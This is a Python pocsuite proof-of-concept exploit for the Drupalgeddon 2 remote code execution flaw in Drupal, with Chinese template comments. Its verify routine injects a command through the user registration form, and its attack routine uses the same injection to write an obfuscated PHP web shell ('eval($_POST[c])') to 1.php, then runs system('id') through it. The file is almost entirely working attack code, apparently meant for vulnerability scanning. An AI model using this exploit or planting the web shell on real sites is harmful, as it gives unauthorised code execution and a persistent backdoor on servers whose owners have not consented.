#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib
import random
import string
from collections import OrderedDict

from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

proxies = {"http":"http://127.0.0.1:8080"}

class TestPOC(POCBase):
	vulID = '97207'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
	version = '1' #默认为1
	author = 'Gaia' #  PoC作者的大名
	vulDate = '2018-03-29' #漏洞公开的时间,不知道就写今天
	createDate = '2018-04-14'# 编写 PoC 的日期
	updateDate = '2018-04-14'# PoC 更新的时间,默认和编写时间一样
	references = ['https://research.checkpoint.com/uncovering-drupalgeddon-2/']# 漏洞地址来源,0day不用写
	name = 'Drupal Drupalgeddon 2 远程代码执行漏洞'# PoC 名称
	appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
	appName = 'Drupal'# 漏洞应用名称
	appVersion = '<7.58, 8.x<8.3.9, 8.4.x<8.4.6, 8.5.x<8.5.1'# 漏洞影响版本
	vulType = 'Remote Code Execution'#漏洞类型,类型参考见 漏洞类型规范表
	desc = '''
	Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞
	 ''' # 漏洞简要描述
	samples = []# 测试样列,就是用 PoC 测试成功的网站
	install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

	def _attack(self):
		result = {}
		vul_url = '%s/user/register?element_parents=account/mail/%%23value&ajax_form=1&_wrapper_format=drupal_ajax' % self.url
		cmd = "echo ':=nfn ct_j($]NMQRYa[)9' | tr '.-x' '0-z'|tee 1.php"
		payload = {"form_id":"user_register_form"
		,"_drupal_ajax":"1"
		,"mail[#post_render][]":"exec"
		,"mail[#type]":"markup"
		,"mail[#markup]":cmd}

		# if not self._verify(verify=False):
		# 	return self.parse_attack(result)

		# print urllib.urlencode(payload)
		response = req.post(vul_url, data=payload,proxies=proxies)
		# response = req.post(vul_url, data=payload)
		# print response.content
		if response.status_code == 200:
			res = req.post(url = self.url+"/1.php",data={"c":"system(\"id\");"},proxies=proxies)
			if "uid" in res.content:
				# print res.content	
				result['ShellInfo'] = {}
				result['ShellInfo']['URL'] = self.url + "/1.php"
				result['ShellInfo']['content'] = '<?php eval($_POST[c]);'

		return self.parse_attack(result)

	def _verify(self, verify=True):
		result = {}
		vul_url = '%s/user/register?element_parents=account/mail/%%23value&ajax_form=1&_wrapper_format=drupal_ajax' % self.url
		cmd = "id"
		payload = {"form_id":"user_register_form"
		,"_drupal_ajax":"1"
		,"mail[#post_render][]":"exec"
		,"mail[#type]":"markup"
		,"mail[#markup]":cmd}


		response = req.post(vul_url, data=payload,proxies=proxies).content
		# response = req.post(vul_url, data=payload).content
		if 'uid' in response:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = self.url
			result['VerifyInfo']['Payload'] = urllib.urlencode(payload)
		else:
			return self.parse_attack(result)

		return self.parse_attack(result)

	def parse_attack(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Internet nothing returned')
		return output

register(TestPOC)
